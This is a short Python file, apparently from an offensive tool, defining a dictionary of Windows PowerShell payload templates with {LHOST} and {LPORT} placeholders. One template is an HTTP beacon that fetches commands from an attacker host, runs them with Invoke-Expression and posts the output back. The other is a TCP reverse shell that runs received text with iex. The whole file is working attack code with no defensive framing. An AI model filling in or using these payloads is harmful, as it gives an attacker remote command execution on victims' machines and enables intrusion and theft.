# Windows payload templates with {LHOST} and {LPORT}

payloads = {
	"powershell_http_agent": {
		"template": (
			"$u=\"http://{LHOST}:{LPORT}\";"
			"$p=\"beacon-cmd\";"
			"$h=@{Authorization=\"beacon-cmd\"};"
			"while($true){"
				"try{"
					"$cmd=Invoke-RestMethod -Uri (\"$u/cmd\") -Headers $h -Method GET -UseBasicParsing;"
					"if($cmd){$o=(Invoke-Expression $cmd | Out-String);Invoke-RestMethod -Uri (\"$u/out\") -Headers @{Authorization=\"beacon-cmd\"} -Method POST -Body $o -UseBasicParsing}"
				"}catch{};Start-Sleep -Seconds 5}"
		),
		"transport": "http",
	},
	"powershell_tcp_reverse": {
		"template": (
			"$client=New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});"
			"$stream=$client.GetStream();$writer=New-Object IO.StreamWriter $stream;$buffer=New-Object byte[] 1024;"
			"$enc=new-object Text.ASCIIEncoding;"
			"while(($i=$stream.Read($buffer,0,1024)) -ne 0){$data=$enc.GetString($buffer,0,$i);$send=(iex $data 2>&1 | Out-String);$bytes=$enc.GetBytes($send);$stream.Write($bytes,0,$bytes.Length);$stream.Flush()}"
		),
		"transport": "tcp",
	},
}